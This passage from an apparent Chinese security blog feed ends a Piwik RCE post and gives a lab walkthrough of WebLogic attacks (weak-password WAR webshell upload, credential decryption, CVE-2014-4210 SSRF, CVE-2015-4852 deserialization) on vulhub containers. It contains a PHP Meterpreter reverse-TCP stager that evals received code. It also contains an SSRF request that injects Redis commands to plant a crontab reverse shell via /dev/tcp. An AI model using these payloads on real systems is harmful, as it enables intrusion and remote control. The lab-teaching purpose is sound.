class="keyword">elseif</span> (($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">$s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; </span><br><span class="line">&#125; <span class="keyword">elseif</span> (($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">$s = $f(AF_INET, SOCK_STREAM, SOL_TCP); </span><br><span class="line">$res = @socket_connect($s, $ip, $port); </span><br><span class="line"><span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; </span><br><span class="line">$s_type = <span class="string">'socket'</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'no socket funcs'</span>);</span><br><span class="line">&#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; </span><br><span class="line"><span class="keyword">switch</span> ($s_type) &#123; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; </span><br><span class="line">$a = unpack(<span class="string">"Nlen"</span>, $len); </span><br><span class="line">$len = $a[<span class="string">'len'</span>]; </span><br><span class="line">$b = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">while</span> (strlen($b) &lt; $len) &#123; </span><br><span class="line"><span class="keyword">switch</span> ($s_type) &#123; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$GLOBALS[<span class="string">'msgsock'</span>] = $s; </span><br><span class="line">$GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; </span><br><span class="line"><span class="keyword">eval</span>($b);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是利用上传插件来上传插件并激活了。</p><p>正确姿势：</p><p><img src="msf_ubuntu_success.jpg" alt="msf_ubuntu_success"></p><blockquote><p>请注意要加<code>set PAYLOAD php/meterpreter/reverse_tcp</code>，不然会报各种错误。</p></blockquote><p>下面的为其中的错误。</p><p><img src="msf_ubuntu.jpg" alt="msf_ubuntu"></p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="noopener">https://firefart.at/post/turning_piwik_superuser_creds_into_rce/</a><br>[2]<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/7917</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-概述&quot;&gt;&lt;a href=&quot;#0x01-概述&quot; class=&quot;headerlink&quot; title=&quot;0x01 概述&quot;&gt;&lt;/a&gt;0x01 概述&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://piwik.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Piwik&lt;/a&gt;是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。&lt;/p&gt;
&lt;p&gt;Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="Metasploit" scheme="https://fuping.site/tags/Metasploit/"/>
    
      <category term="piwik" scheme="https://fuping.site/tags/piwik/"/>
    
      <category term="漏洞分析" scheme="https://fuping.site/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic 常见漏洞环境的搭建及其利用</title>
    <link href="https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/"/>
    <id>https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</id>
    <published>2017-06-05T01:19:34.000Z</published>
    <updated>2017-06-09T03:16:54.420Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-WebLogic-介绍及常见漏洞"><a href="#0x00-WebLogic-介绍及常见漏洞" class="headerlink" title="0x00 WebLogic 介绍及常见漏洞"></a>0x00 WebLogic 介绍及常见漏洞</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。<br>WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。本文将利用phith0n提供的漏洞利用环境进行验证(在此向P牛致敬，感谢无私奉献)，Weblogic的环境地址<a href="https://github.com/phith0n/vulhub/tree/master/weblogic。" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/tree/master/weblogic。</a></p><a id="more"></a><h3 id="0x01-WebLogic-弱口令导致上传并部署war包获取WEBSHELL"><a href="#0x01-WebLogic-弱口令导致上传并部署war包获取WEBSHELL" class="headerlink" title="0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL"></a>0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL</h3><p>通过WebLogic弱口令登录后，上传war包，来获取WEBSHELL。<br>下载项目后进入到<code>/weblogic/weak_password</code>目录，运行命令<code>sudo docker-compose build</code>进行编译（请参照<a href="https://github.com/phith0n/vulhub/blob/master/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/README.md</a> 进行docker的安装）。<br>编译完成后进行启动<br>使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker-compose up -d <span class="comment">#启动</span></span><br><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker ps <span class="comment">#查看启动的docker</span></span><br></pre></td></tr></table></figure><p><img src="%E5%90%AF%E5%8A%A8WebLogic%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%8E%AF%E5%A2%83.png" alt="启动WebLogic弱口令环境"></p><p>Ubuntu的ip为192.168.232.137，WebLogic的访问地址为：<a href="http://192.168.232.137:7001" target="_blank" rel="noopener">http://192.168.232.137:7001</a></p><p><img src="%E8%AE%BF%E9%97%AEWebLogic%E5%BC%B1%E5%8F%A3%E4%BB%A4web%E9%A1%B9%E7%9B%AE.png" alt="访问WebLogic弱口令web项目"></p><p>访问 <a href="http://192.168.232.137:7001/console" target="_blank" rel="noopener">http://192.168.232.137:7001/console</a> 会跳转到管理员登录页面<a href="http://192.168.232.137:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.232.137:7001/console/login/LoginForm.jsp</a></p><p>这里用户名密码分别为：weblogic/Oracle@123<br>上传war过程如下图所示<br><img src="%E4%B8%8A%E4%BC%A0war%E8%BF%87%E7%A8%8B.gif" alt="上传war过程"></p><p>总结起来就是：<code>域结构-部署-安装-上传文件-将此部署安装为应用程序</code>。然后访问项目名称即可。</p><blockquote><p>如果不存在弱口令，可以根据其他漏洞获取SerializedSystemIni.dat和config.xml，然后解密即可。具体案例可以参考<a href="https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md</a> ，这里采用了任意文件读取漏洞，获取了SerializedSystemIni.dat和config.xml文件内容，然后解密。</p></blockquote><p><strong>WebLogic加密解密方式</strong></p><p>WebLogic 11gR1后采用了AES的加密方式，默认的管理密码文件存放于：<br><code>安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code></p><p>例如靶机中的密码文件位于：<br><code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties</code></p><p>内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;AES&#125;xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=</span><br><span class="line">password=&#123;AES&#125;dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU=</span><br></pre></td></tr></table></figure><p>加密key保存在SerializedSystemIni.dat文件中。默认位置：<br><code>安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p><p>靶机中的位于：<br><code>/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat</code></p><p>采用这两个文件就可以进行解密了。<br><img src="%E8%A7%A3%E5%AF%86%E5%AF%86%E7%A0%81.png" alt="解密WebLogic密码"></p><p>WebLogic 11gR1之前的版本采用的DES加密方式。<br><code>安装目录/samples/domains/wl_server/security/boot.properties</code><br>内容格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==</span><br><span class="line">password=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==</span><br></pre></td></tr></table></figure><p>采用上面的解密工具即可解密。</p><h3 id="0x02-WebLogic-SSRF漏洞"><a href="#0x02-WebLogic-SSRF漏洞" class="headerlink" title="0x02 WebLogic SSRF漏洞"></a>0x02 WebLogic SSRF漏洞</h3><p>漏洞编号：CVE-2014-4210<br>漏洞影响：<br>    版本10.0.2,10.3.6<br>    Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。<br>进入到<code>/weblogic/ssrf</code>目录，运行命令<code>sudo docker-compose build</code>进行编译。</p><blockquote><p>编译时将Dockerfile文件中的第六行<code>&amp;&amp; yum update \</code>修改为<code>&amp;&amp; yum update -y \</code>，不然会出现错误<code>ERROR: Service &#39;redis&#39; failed to build: The command &#39;/bin/sh -c set -ex     &amp;&amp; yum update     &amp;&amp; yum install -y gcc-c++ tcl wget&#39; returned a non-zero code: 1</code>。并且无法编译。（感谢P牛的解答）</p></blockquote><p>编译完成后进行启动<br>使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker-compose up -d <span class="comment">#启动</span></span><br><span class="line">fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker ps <span class="comment">#查看启动的docker</span></span><br></pre></td></tr></table></figure><p>![启动WebLogic SSRF环境](启动WebLogic SSRF环境.png)</p><p>利用<a href="https://github.com/fupinglee/MyPython/blob/master/weblogic/weblogic_ssrf.py" target="_blank" rel="noopener">脚本</a>扫描内网开放端口的主机。</p><p><img src="SSRF%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" alt="SSRF扫描结果"></p><p>根据<a href="https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md</a> 利用Redis反弹shell<br>在Ubuntu上执行命令<code>nc -l -p 1234</code><br>发送请求包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/<span class="built_in">test</span>%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.232.137%2F1234%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.1</span><br><span class="line">Host: 192.168.232.137:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=6L9hZ1GCsBrQWk49rcJ5K1zxygCPpysB4FrD8xk27XV50KzBh2rT!657144266; JSESSIONID=Q92gZ1fYpmLHP5yCxg4TpdjKCTTHhKTTZS1XKXTNDNf40R80H5J0!-1544297006</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="%E5%8F%91%E9%80%81HTTP%E8%AF%B7%E6%B1%82.png" alt="发送HTTP请求"></p><p>过一会查看Ubuntu可以看到一个shell</p><p><img src="%E5%8F%8D%E5%BC%B9shell.png" alt="反弹shell"></p><p><strong>修复建议：</strong><br>    1.如果业务不需要UDDI功能，就关闭这个功能。可以删除uddiexporer文件夹，可以可在/weblogicPath/server/lib/uddiexplorer.war解压后，注释掉上面的jsp再打包。<br>    2.安装oracle的更新包。</p><h3 id="0x03-WebLogic-反序列化漏洞"><a href="#0x03-WebLogic-反序列化漏洞" class="headerlink" title="0x03 WebLogic 反序列化漏洞"></a>0x03 WebLogic 反序列化漏洞</h3><p>漏洞编号：CVE-2015-4852<br>漏洞影响：<br>    Oracle WebLogic Server 12.2.1.0<br>    Oracle WebLogic Server 12.1.3.0<br>    Oracle WebLogic Server 12.1.2.0<br>    Oracle WebLogic Server 10.3.6.0<br>    Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0版本中，WLS Security组件允许远程攻击者执行任意命令。攻击者通过向TCP端口7001发送T3协议流量，其中包含精心构造的序列化Java对象利用此漏洞。此漏洞影响到WLS Security Handler的文件oracle_common/modules/com.bea.core.apache.commons.collections.jar内一个未知的函数。</p><p>这里还以SSRF的环境为例。<br>使用WebLogic反序列化工具进行验证（作者：rebeyond)。<br><img src="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png" alt="反序列化1"></p><p>一般web项目位于<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/</code>中<br><img src="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962.png" alt="反序列化2"></p><p>发现没有_WL_user目录，所以把shell上传到自带的项目中。</p><p>通过执行命令<code>ls /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/</code><br>发现有三个目录，分别为bea_wls9_async_response、bea_wls_internal和uddiexplorer。<br>将shell文件上传到任意一个目录下的war文件即可。</p><p>上传路径<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.txt</code></p><p><img src="%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6.png" alt="上传测试文件"></p><p>上传路径<code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/jspy.jsp</code></p><p><img src="%E4%B8%8A%E4%BC%A0webshell.png" alt="上传webshell"></p><p>也可以使用weget下载。</p><p>使用weak_password时，上传路径为</p><p><code>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/1.txt</code></p><p><img src="%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B62.png" alt="上传测试文件2"></p><blockquote><p>找WEB绝对路径的另一种方式，Linux下使用命令<code>find -name *.jsp</code>来查找，例如已知hello项目里面有个file.jsp，则查找的命令为<code>find -name file.jsp</code>。对于Windows下，使用<code>for /r c:\ %i in (file*.jsp) do @echo %i</code>，也可以通过查看config/config.xml文件内容来确定web项目的绝对路径。</p></blockquote><p><strong>linux下查找文件路径</strong></p><p><img src="%E6%89%BE%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95.png" alt="找文件目录"></p><p><strong>Windows下查找路径</strong><br><img src="Windows%E4%B8%8B%E6%9F%A5%E6%89%BE%E8%B7%AF%E5%BE%84.png" alt="Windows下查找路径"></p><p><strong>修复建议：</strong><br>    1.过滤T3协议<br>    2.安装补丁</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>主要采用了phith0n提供的WebLogic利用环境进行对WebLogic漏洞的验证。包括有WebLogic弱口令获取WEBSHELL、SSRF漏洞利用和WebLogic反序列化漏洞的利用等。总结下来一共有这三个问题。<br>1.对于WebLogic弱口令，如何去上传WEBSHELL<br>2.对于SSRF漏洞，如何探测内网存活的主机以及开放的端口，并如何利用这些端口。<br>3.对于反序列化漏洞，如何快速的找到WEB路径以及对应的物理路径。</p><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p>[1]<a href="https://github.com/phith0n/vulhub/tree/master/weblogic" target="_blank" rel="noopener">https://github.com/phith0n/vulhub/tree/master/weblogic</a><br>[2]<a href="http://blog.csdn.net/chs007chs/article/details/52514888" target="_blank" rel="noopener">http://blog.csdn.net/chs007chs/article/details/52514888</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-WebLogic-介绍及常见漏洞&quot;&gt;&lt;a href=&quot;#0x00-WebLogic-介绍及常见漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x00 WebLogic 介绍及常见漏洞&quot;&gt;&lt;/a&gt;0x00 WebLogic 介绍及常见漏洞&lt;/h3&gt;&lt;p&gt;WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。&lt;br&gt;WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。本文将利用phith0n提供的漏洞利用环境进行验证(在此向P牛致敬，感谢无私奉献)，Weblogic的环境地址&lt;a href=&quot;https://github.com/phith0n/vulhub/tree/master/weblogic。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/phith0n/vulhub/tree/master/weblogic。&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://fuping.site/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="SSRF" scheme="https://fuping.site/tags/SSRF/"/>
    
      <category term="WebLogic漏洞" scheme="https://fuping.site/tags/WebLogic%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="WebLogic反序列化" scheme="https://fuping.site/tags/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
